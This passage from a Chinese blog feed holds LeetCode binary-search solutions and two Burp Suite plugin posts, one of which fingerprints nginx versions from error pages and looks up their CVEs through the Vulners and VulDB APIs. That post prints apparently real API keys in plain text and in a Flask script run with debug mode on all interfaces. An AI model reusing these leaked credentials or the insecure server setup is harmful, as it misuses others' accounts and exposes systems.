含重复值"></a>4.1 <a href="https://leetcode-cn.com/problems/search-in-rotated-sorted-array-ii/">LTD81搜索旋转排序数组 II 含重复值</a></h3><h4 id="题目描述：-6"><a href="#题目描述：-6" class="headerlink" title="题目描述："></a>题目描述：</h4><p>已知存在一个按非降序排列的整数数组 nums ，数组中的值不必互不相同。</p><p>在传递给函数之前，nums 在预先未知的某个下标 k（0 &lt;= k &lt; nums.length）上进行了 旋转 ，使数组变为 [nums[k], nums[k+1], …, nums[n-1], nums[0], nums[1], …, nums[k-1]]（下标 从 0 开始 计数）。例如， [0,1,2,4,4,4,5,6,6,7] 在下标 5 处经旋转后可能变为 [4,5,6,6,7,0,1,2,4,4] 。</p><p>给你 旋转后 的数组 nums 和一个整数 target ，请你编写一个函数来判断给定的目标值是否存在于数组中。如果 nums 中存在这个目标值 target ，则返回 true ，否则返回 false 。</p><p> 示例 1：</p><pre><code>输入：nums = [2,5,6,0,0,1,2], target = 0输出：true</code></pre><p>示例 2：</p><pre><code>输入：nums = [2,5,6,0,0,1,2], target = 3输出：false</code></pre><h4 id="解题思路：-3"><a href="#解题思路：-3" class="headerlink" title="解题思路："></a>解题思路：</h4><p>这个题目是3.1的变形，对于数组中有重复元素的情况，二分查找时可能会有a[left]=a[mid]=a[right]，此时无法判断哪个区间是有序的。</p><p>例如nums=[3,1,2,3,3,3,3]，target=2，首次二分时无法判断区间 [0,3][0,3] 和区间 [4,6][4,6] 哪个是有序的。</p><p>对于这种情况，我们只能将当前二分区间的左边界加一，右边界减一，然后在新区间上继续二分查找。</p><h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">search</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nums<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        :type nums: List[int]        :type target: int        :rtype: int        """</span>        left<span class="token punctuation">,</span>right<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>left<span class="token operator">&lt;=</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span>            mid<span class="token operator">=</span>left<span class="token operator">+</span><span class="token punctuation">(</span>right<span class="token operator">-</span>left<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>            <span class="token comment" spellcheck="true">#step1 判断mid的位置</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token operator">==</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token boolean">True</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token operator">==</span>nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span> <span class="token operator">and</span> nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token operator">==</span>nums<span class="token punctuation">[</span>right<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#去掉重复值</span>                left<span class="token operator">=</span>left<span class="token operator">+</span><span class="token number">1</span>                right<span class="token operator">=</span>right<span class="token number">-1</span>            <span class="token keyword">elif</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token operator">>=</span>nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#[left,mid]有序  ##注意这里要用elif：因为去掉重复值后开启新的判断，即新的left,right</span>                <span class="token comment" spellcheck="true">#step2 判断target的位置</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>target<span class="token operator">&lt;</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">and</span> target<span class="token operator">>=</span>nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#target在左边</span>                    right<span class="token operator">=</span>mid<span class="token number">-1</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    left<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#[left,mid]无序，[mid,right]有序</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>target<span class="token operator">></span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">and</span> target<span class="token operator">&lt;</span>nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#target在右边</span>                    left<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    right<span class="token operator">=</span>mid<span class="token number">-1</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token comment" spellcheck="true">#没有查到</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="复杂的分析"><a href="#复杂的分析" class="headerlink" title="复杂的分析"></a>复杂的分析</h4><h3 id="4-2-LTD154-寻找旋转排序数组中的最小值-II-含重复值"><a href="#4-2-LTD154-寻找旋转排序数组中的最小值-II-含重复值" class="headerlink" title="4.2 LTD154. 寻找旋转排序数组中的最小值 II 含重复值"></a>4.2 <a href="https://leetcode-cn.com/problems/find-minimum-in-rotated-sorted-array-ii/">LTD154. 寻找旋转排序数组中的最小值 II</a> 含重复值</h3><h4 id="题目描述：-7"><a href="#题目描述：-7" class="headerlink" title="题目描述："></a>题目描述：</h4><p>已知一个长度为 n 的数组，预先按照升序排列，经由 1 到 n 次 旋转 后，得到输入数组。例如，原数组 nums = [0,1,4,4,5,6,7] 在变化后可能得到：<br>若旋转 4 次，则可以得到 [4,5,6,7,0,1,4]<br>若旋转 7 次，则可以得到 [0,1,4,4,5,6,7]<br>注意，数组 [a[0], a[1], a[2], …, a[n-1]] 旋转一次 的结果为数组 [a[n-1], a[0], a[1], a[2], …, a[n-2]] 。</p><p>给你一个可能存在 重复 元素值的数组 nums ，它原来是一个升序排列的数组，并按上述情形进行了多次旋转。请你找出并返回数组中的 最小元素 。</p><p>示例 1：</p><p>输入：nums = [1,3,5]<br>输出：1</p><p>示例 2：</p><p>输入：nums = [2,2,2,0,1]<br>输出：0</p><h4 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h4><p>在3.2的基础上 判断考虑（3）nums[mid]==nums[right]的情况：</p><p>（3）当nums[mid]==nums[right]时候，我们无法判断最小值在左边还是右边，此时舍弃num[right]即可。</p><h4 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">findMin</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>nums<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        :type nums: List[int]        :rtype: int        """</span>        left<span class="token punctuation">,</span>right<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span>        <span class="token keyword">while</span> left<span class="token operator">&lt;</span>right<span class="token punctuation">:</span>            mid<span class="token operator">=</span>left<span class="token operator">+</span><span class="token punctuation">(</span>right<span class="token operator">-</span>left<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>            <span class="token keyword">if</span> nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token operator">&lt;</span>nums<span class="token punctuation">[</span>right<span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#[left,mid]有序</span>                <span class="token comment" spellcheck="true"># 如果中间值小于最大值，则最大值减小</span>                <span class="token comment" spellcheck="true"># 疑问：为什么</span>                <span class="token comment" spellcheck="true"># high = mid;</span>                <span class="token comment" spellcheck="true"># 而不是</span>                <span class="token comment" spellcheck="true"># high = mid - 1;</span>                <span class="token comment" spellcheck="true"># 解答：&amp;#123;4, 5, 1, 2, 3&amp;#125;，如果high = mid - 1，则丢失了最小值1</span>                right<span class="token operator">=</span>mid<span class="token comment" spellcheck="true">#如果mid是最小值 则right=mid-1会错过最小值</span>            <span class="token keyword">elif</span> nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token operator">></span>nums<span class="token punctuation">[</span>right<span class="token punctuation">]</span><span class="token punctuation">:</span>                <span class="token comment" spellcheck="true"># 如果中间值大于最大值，则最小值变大</span>                <span class="token comment" spellcheck="true">#疑问：为什么</span>                <span class="token comment" spellcheck="true"># low = mid + 1;</span>                <span class="token comment" spellcheck="true"># 而不是</span>                <span class="token comment" spellcheck="true"># low = mid;</span>                <span class="token comment" spellcheck="true"># 解答：&amp;#123;4, 5, 6, 1, 2, 3&amp;#125;，nums[mid] = 6，low = mid + 1, 刚好nums[low] = 1</span>                <span class="token comment" spellcheck="true">#继续疑问：上边的解释太牵强了，难道没有可能low = mid + 1, 正好错过了最小值</span>                <span class="token comment" spellcheck="true">#继续解答：不会错过!!! 因为nums[mid]>=nums[right],所以nums[mid]一定不是最小值</span>                left<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#nums[mid]==nums[right]</span>                right<span class="token operator">=</span>right<span class="token number">-1</span>        <span class="token keyword">return</span> nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ol><li><a href="https://leetcode-cn.com/circle/discuss/Z80AkT/">二分法题目集合</a>  不错    </li><li><a href="https://leetcode-cn.com/problems/search-in-rotated-sorted-array-ii/solution/yi-wen-dai-ni-gao-ding-er-fen-sou-suo-ji-ki52/">一文带你搞定二分搜索及多个变种</a></li><li><a href="https://www.bilibili.com/video/BV1d54y1q7k7">相关b站视频</a></li></ol>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/leetcode/">leetcode</category>
      
      
      <comments>https://m01ly.github.io/2021/05/26/leetcode-binary/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>开发burpsuite插件-识别nginx版本并列出已知CVE</title>
      <link>https://m01ly.github.io/2021/05/24/burpsuite-develop-detect-nginx/</link>
      <guid>https://m01ly.github.io/2021/05/24/burpsuite-develop-detect-nginx/</guid>
      <pubDate>Mon, 24 May 2021 09:39:05 GMT</pubDate>
      
      <description>&lt;p&gt;最近需要开发一个插件：首先需要识别初nginx的版本号，其次需要列出该版本号存在的CVE漏洞列表。&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>最近需要开发一个插件：首先需要识别初nginx的版本号，其次需要列出该版本号存在的CVE漏洞列表。<a id="more"></a></p><h1 id="1-识别nginx版本号"><a href="#1-识别nginx版本号" class="headerlink" title="1 识别nginx版本号"></a>1 识别nginx版本号</h1><p>首先识别nginx的版本号，我们知道nginx错误页会暴露该版本号，因此我们只需要解析response报文，利用正则表达式匹配出版本号即可。</p><p><img src="/2021/05/24/burpsuite-develop-detect-nginx/1624603419556.png" alt="1624603419556"></p><p>(1)获取Response报文</p><pre class="line-numbers language-java"><code class="language-java">String response <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>messageInfo<span class="token punctuation">.</span><span class="token function">getResponse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>(2)定义识别nginx的正则表达式为nginx/\d+(\.\d+){2}+然后进行正则匹配，获得nginx版本号</p><pre class="line-numbers language-java"><code class="language-java">String nginxRegex <span class="token operator">=</span> <span class="token string">"nginx/\\d+(\\.\\d+)&amp;#123;2&amp;#125;+"</span><span class="token punctuation">;</span>Pattern p <span class="token operator">=</span> Pattern<span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span>RegexStr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 现在创建 matcher 对象</span>String detectVersion<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span>Matcher m <span class="token operator">=</span> p<span class="token punctuation">.</span><span class="token function">matcher</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    detectVersion <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token function">group</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//得到nginx版本</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将上述代码编译成jar文件，加载到burpsuite上，运行如下：识别nginx成功。</p><p><img src="/2021/05/24/burpsuite-develop-detect-nginx/1621909703111.png" alt="1621909703111"></p><h1 id="2-检索该版本对应的CVE漏洞"><a href="#2-检索该版本对应的CVE漏洞" class="headerlink" title="2 检索该版本对应的CVE漏洞"></a>2 检索该版本对应的CVE漏洞</h1><p>检索对应版本存在的CVE漏洞其实有很多的网站：</p><p>例如下面几个网站 但是大多数的网站 该搜索功能结果都没有很准确</p><p><a href="https://snyk.io/vuln/npm:lodash@4.17.15">https://snyk.io/vuln/npm:lodash@4.17.15</a>   结果准确</p><p><a href="https://vulners.com/search?query=affectedSoftware.name:nginx%20AND%20affectedSoftware.version:%221.17.7%22">https://vulners.com/search?query=affectedSoftware.name:nginx%20AND%20affectedSoftware.version:%221.17.7%22</a>  结果特别不准确</p><p><a href="https://vuldb.com/zh/?search.advanced#results">https://vuldb.com/zh/?search.advanced#results</a> 结果相对准确 但是不全 有遗漏</p><p>burpsuite</p><p>识别nginx版本并索引已经知道的CVE漏洞：<br>搜索已经知道的CVE漏洞：<br>1 爬虫：爬取vul,cve网站上的CVE信息：网站设置防爬<br>2 匹配：正则匹配？机器学习去匹配</p><p>调研：bp的插件：Software Vulnerability Scanner利用vulner.comAPI进行扫描探测</p><p>初步思路：</p><h1 id="第一种API接口使用："><a href="#第一种API接口使用：" class="headerlink" title="第一种API接口使用："></a>第一种API接口使用：</h1><p>问题：python有对应的库但是存在burpsuite加载不成功的问题，但是java无，只能通过APi访问，但是 搜索不准确，</p><p><a href="https://vulners.com/">https://vulners.com/</a></p><p><img src="/2021/05/24/burpsuite-develop-detect-nginx/1622014351054.png" alt="1622014351054"></p><p><img src="/2021/05/24/burpsuite-develop-detect-nginx/1622015887598.png" alt="1622015887598"></p><p>获取API获取Vulners API密钥</p><p>请在<a href="https://vulners.com/">Vulners网站上</a>注册。通过单击右上角的名称进入个人菜单。遵循“ API KEYS”标签。生成范围为“ <strong>api</strong>”的API密钥，并将其与库一起使用。</p><p><img src="/2021/05/24/burpsuite-develop-detect-nginx/1622081435003.png" alt="1622081435003"></p><p><strong>API Key -</strong> 7CX5RVZEMZ6M5RGRI3GPJ6IEJO0ZSV6JLZ7SHO022C1ZJ7XIB32EJIB0NI47ICFK</p><p><strong>Created -</strong> 2021-05-27T05:10:27</p><p><strong>License Type -</strong> free</p><p><strong>Scope</strong></p><p>api</p><p><strong>IP List</strong></p><p>报错：</p><p><img src="/2021/05/24/burpsuite-develop-detect-nginx/1622097162280.png" alt="1622097162280"></p><p>但是直接在py运行是OK的</p><p>第三种</p><p><a href="https://github.com/vulnersCom/api">https://github.com/vulnersCom/api</a></p><p>先安装该库</p><pre><code>pip install -U vulners</code></pre><p>get-vulner-cve.py</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> jsonify<span class="token keyword">import</span> vulnersapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/getcvelist"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getcvelist</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    API_KEY<span class="token operator">=</span><span class="token string">"7CX5RVZEMZ6M5RGRI3GPJ6IEJO0ZSV6JLZ7SHO022C1ZJ7XIB32EJIB0NI47ICFK"</span>    vulners_api <span class="token operator">=</span> vulners<span class="token punctuation">.</span>Vulners<span class="token punctuation">(</span>api_key<span class="token operator">=</span>API_KEY<span class="token punctuation">)</span>    json_data <span class="token operator">=</span> request<span class="token punctuation">.</span>json    software<span class="token operator">=</span>json_data<span class="token punctuation">[</span><span class="token string">"software"</span><span class="token punctuation">]</span>    version<span class="token operator">=</span>json_data<span class="token punctuation">[</span><span class="token string">"version"</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true"># return software+version</span>    sw_results <span class="token operator">=</span> vulners_api<span class="token punctuation">.</span>softwareVulnerabilities<span class="token punctuation">(</span>software<span class="token punctuation">,</span> version<span class="token punctuation">)</span>    sw_vulnerabilities_list <span class="token operator">=</span> <span class="token punctuation">[</span>sw_results<span class="token punctuation">.</span>get<span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token keyword">for</span> key <span class="token keyword">in</span> sw_results <span class="token keyword">if</span> key <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'NVD'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span>res<span class="token operator">=</span>sw_vulnerabilities_list<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>nohup python3 get-vulner-cve.py &amp;</code></pre><p>API用法参考：<a href="https://github.com/vulnersCom/api/blob/master/samples/software_scanner.py">https://github.com/vulnersCom/api/blob/master/samples/software_scanner.py</a></p><h1 id="第二种API使用"><a href="#第二种API使用" class="headerlink" title="第二种API使用"></a>第二种API使用</h1><p><a href="https://vuldb.com/zh/?doc.api">https://vuldb.com/zh/?doc.api</a></p><p>API： 8ddd49c11f021f3e3b6f192c54a9f794 </p><p>但是每天只有50次积分  并且搜索不全面</p><p>pass</p><p><img src="/2021/05/24/burpsuite-develop-detect-nginx/1623219451415.png" alt="1623219451415"></p><p><img src="/2021/05/24/burpsuite-develop-detect-nginx/1623220355231.png" alt="1623220355231"></p><p><a href="https://docs.vulners.com/api/">Vulners官方API使用说明</a></p><p><a href="https://github.com/vulnersCom/api/blob/master/samples/software_scanner.py">Vulners API使用参考</a></p><p><a href="https://c.runoob.com/front-end/854">正则表达式在线测试</a></p><p><a href="https://blog.csdn.net/zp437734552/article/details/51469549">正则表达式判断版本号</a></p><p><a href="https://github.com/portswigger/software-vulnerability-scanner">根据版本号搜索CVE的插件</a></p><p><a href="http://sh1yan.top/2020/03/02/Writing-the-burpseuite-plug-in-beginner/">API解释</a></p><p>app-portal:</p><p><img src="/2021/05/24/burpsuite-develop-detect-nginx/1623380555468.png" alt="1623380555468"></p><p>dev-portal:</p><p><img src="/2021/05/24/burpsuite-develop-detect-nginx/1623380707202.png" alt="1623380707202"></p><p><img src="/2021/05/24/burpsuite-develop-detect-nginx/1623380812981.png" alt="1623380812981"></p><p><img src="/2021/05/24/burpsuite-develop-detect-nginx/1623380835346.png" alt="1623380835346"></p><p><img src="/2021/05/24/burpsuite-develop-detect-nginx/1623380855686.png" alt="1623380855686"></p><p><img src="/2021/05/24/burpsuite-develop-detect-nginx/1623380922717.png" alt="1623380922717"></p><p><a href="https://portal-ppe1.envisioniot.com/portal/testt">https://portal-ppe1.envisioniot.com/portal/testt</a></p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91/">插件开发</category>
      
      
      <comments>https://m01ly.github.io/2021/05/24/burpsuite-develop-detect-nginx/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>从0开发burpsuite插件（Java）</title>
      <link>https://m01ly.github.io/2021/05/21/burpsuite-develop/</link>
      <guid>https://m01ly.github.io/2021/05/21/burpsuite-develop/</guid>
      <pubDate>Fri, 21 May 2021 08:41:38 GMT</pubDate>
      
      <description>&lt;p&gt;本人从0开始，写一个bp的开发教程，思路为：跟着教程搭建出一个可以用在burpsuite的插件，然后在此基础上构建一个由GUI的插件，后面进一步去熟悉插件相关的API函数。本文教程基于gradle项目，因为方便引言一些插件库。&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>本人从0开始，写一个bp的开发教程，思路为：跟着教程搭建出一个可以用在burpsuite的插件，然后在此基础上构建一个由GUI的插件，后面进一步去熟悉插件相关的API函数。本文教程基于gradle项目，因为方便引言一些插件库。<a id="more"></a></p><h2 id="1-一个小的bp插件Demo"><a href="#1-一个小的bp插件Demo" class="headerlink" title="1 一个小的bp插件Demo"></a>1 一个小的bp插件Demo</h2><h3 id="1-1新建一个gradle项目"><a href="#1-1新建一个gradle项目" class="headerlink" title="1.1新建一个gradle项目"></a>1.1新建一个gradle项目</h3><p>(1)新建一个gradle项目，项目名为：burp-detect-nginx</p><p><img src="/2021/05/21/burpsuite-develop/1621586533328.png" alt="1621586533328"></p><p>(2)新建完后，在 build.gradle 文件中添加以下依赖，也就是加载 burpsuite 插件API ，如果提示 auto import， 可以点击，从而自动从远程仓库加载 burpsuite API 。具体需要的版本可以去<a href="https://search.maven.org/artifact/net.portswigger.burp.extender/burp-extender-api">Maven中央存储库</a>搜索，这里使用的是1.7.13</p><pre><code>compile(&#39;net.portswigger.burp.extender:burp-extender-api:1.7.13&#39;)</code></pre><p>同时在 plugins 里面添加 shadow 插件，该插件可以方便把项目打包成 jar 包。shadow版本需要根据自己的gadle版本去选择，<a href="https://plugins.gradle.org/m2/com/github/jengelman/gradle/plugins/shadow/">shaow插件版本可以根据这里去选择</a>。这里我的选择的是4.0.3，然后保存 build.gradle文件可以看到加载成功。</p><pre><code>id &#39;com.github.johnrengelman.shadow&#39; version &#39;4.0.3&#39;</code></pre><p><img src="/2021/05/21/burpsuite-develop/1621592658534.png" alt="1621592658534"></p><p>(3)接着在 /src/main/java 目录处创建一个名为 burp 的包名，在 java 目录处右键 -&gt; New -&gt; Package，接着在该包上右键，新建一个名为 BurpExtender 的类。这里需要注意的是这个包名和类名是固定的，burpsuite 加载插件时就是通过 burp.BurpExtender 来查找的，如果不这样起名，会报 ClassNotFoundException 。</p><h3 id="1-2-编写插件"><a href="#1-2-编写插件" class="headerlink" title="1.2 编写插件"></a>1.2 编写插件</h3><p>在BurpExtender 中继承 IBurpExtender 接口，并实现registerExtenderCallbacks方法。（BurpExtender 类需要实现 IBurpExtender 接口，burp 在加载插件时，会调用该接口，并传递 IBurpExtenderCallbacks 接口仅我们使用。）registerExtenderCallbacks方法内添加下面的代码为插件设置名称，并打印一 success 字符串</p><pre><code>callbacks.setExtensionName(&quot;data-collect2&quot;);callbacks.printOutput(&quot;load success&quot;);</code></pre><p><img src="/2021/05/21/burpsuite-develop/1621592834548.png" alt="1621592834548"></p><h3 id="1-3-编译为jar包"><a href="#1-3-编译为jar包" class="headerlink" title="1.3 编译为jar包"></a>1.3 编译为jar包</h3><p>点击右侧的 gradle 菜单，展开菜单，双击 shadowjar ，gradle 会自动编译项目成 jar 包，jar 包位于 build 目录中的 libs 目录中。 选中生成的jar包，右击show in exploer就可以得到我们的jar包</p><p><img src="/2021/05/21/burpsuite-develop/1621593085131.png" alt="1621593085131"></p><h3 id="1-4-burpsuite-加载该jia包"><a href="#1-4-burpsuite-加载该jia包" class="headerlink" title="1.4 burpsuite 加载该jia包"></a>1.4 burpsuite 加载该jia包</h3><p>在 burp 的扩展选项卡Extender-&gt;Extensions–&gt;Add，选择Java类型，加载jar包点next就可以看到加载成功。</p><p><img src="/2021/05/21/burpsuite-develop/1621593214656.png" alt="1621593214656"></p><p>可以看到加载插件后成功打印了 success 字符串。</p><p><img src="/2021/05/21/burpsuite-develop/1621593371239.png" alt="1621593371239"></p><h2 id="2-添加标签页"><a href="#2-添加标签页" class="headerlink" title="2 添加标签页"></a>2 添加标签页</h2><h3 id="2-1-创建一个标签页："><a href="#2-1-创建一个标签页：" class="headerlink" title="2.1 创建一个标签页："></a>2.1 创建一个标签页：</h3><p>(1)先在IDEA中创建一个 Form:file–&gt;new–GUI Form，用于设计UI ：在burp文件夹内如下图方式创建一个 DataCollectGUI.form</p><p><img src="/2021/05/21/burpsuite-develop/1621593462769.png" alt="1621593462769"></p><p>(2)创建的界面如下，左边的窗口中创建了两个文件，一个是 DataCollectGUI.java 文件，该文件与 form 文件绑定，一个是 DataCollectGUI.form 文件，可以在此文件上拖动控件来设计 UI 界面，当界面更新时，会自动生成代码插入 DataCollectGUI.java 文件中。 直接通过拖拉控件到面板即可完成UI设计。</p><p><img src="/2021/05/21/burpsuite-develop/1621593667153.png" alt="1621593667153"></p><h3 id="2-2-打包GUI类"><a href="#2-2-打包GUI类" class="headerlink" title="2.2 打包GUI类"></a>2.2 打包GUI类</h3><p>为了让 IDEA 打包 GUI 界面的类，需要在 build.gradle 添加以下依赖</p><pre><code>compile(&#39;com.intellij:forms_rt:7.0.3&#39;)</code></pre><p>（1）在设置中设置根据 Form 界面自动生成 Java 源码：file-settings-&gt;editor-&gt;GUI Designer–&gt;java source code-apply-ok</p><p><img src="/2021/05/21/burpsuite-develop/1621594071138.png" alt="1621594071138"></p><p>(2)然后在 Gradle 的编译选项中设置编译器是 IDEA 自带的编译器，这样才能自动更新 form 文件中的控件到代码中：file-settings-&gt;Build,Execution,Deployment-&gt;Build Tools-&gt;Gradle:做如图的配置。</p><p><img src="/2021/05/21/burpsuite-develop/1621594242374.png" alt="1621594242374"></p><p>(3)构建项目</p><p>设置好后，点击构建图标，就会自动生成和 form 文件相关的代码，可以看到在 $$$setupUI$$$() 方法中自动生成了我们拖到界面中的3个控件。</p><p><img src="/2021/05/21/burpsuite-develop/1621836741981.png" alt="1621836741981"></p><p>接着需要回到 BurpExtender 类中，要为插件添加一个标签页，需要实现 ITab 接口：实现 ITab 接口后，会有两个方法需要实现，其中 getTabCaption() 方法返回标签页的名称， getUiComponent() 方法返回我们创建的 UI 面板。callbacks.addSuiteTab(this) 来注册接口。</p><p><img src="/2021/05/21/burpsuite-develop/1621837625674.png" alt="1621837625674"></p><h3 id="2-3-设置按钮监听事件"><a href="#2-3-设置按钮监听事件" class="headerlink" title="2.3 设置按钮监听事件"></a>2.3 设置按钮监听事件</h3><p>接下来我们需要获取标签页中的配置内容，可以通过添加事件监听器来实现。回到 IDEA 的 form 文件中，在按钮上右键，点击 Create Listener，选择 ActionListener.在这里简单地把输入框中的内容打印在插件日志中，要把内容打印到插件日志中，我们需要获取 IBurpExtenderCallbacks 对象，可以修改构造函数，在初始化时传入：</p><p><img src="/2021/05/21/burpsuite-develop/1621837911606.png" alt="1621837911606"></p><p> 还需要修改 BurpExtender 中的代码，传入 callbacks 对象</p><p><img src="/2021/05/21/burpsuite-develop/1621837935350.png" alt="1621837935350"></p><p>接着在监听器中实现获取标题内容并打印到日志的代码，代码中29行通过 getText()方法获取输入框架的内容，然后在30行处通过 callbacks.printOutput()方法打印内容到日志中。</p><h3 id="2-4-打包jar"><a href="#2-4-打包jar" class="headerlink" title="2.4 打包jar"></a>2.4 打包jar</h3><p>双击 gradle 中的 shadowjar 按钮重新打包 jar 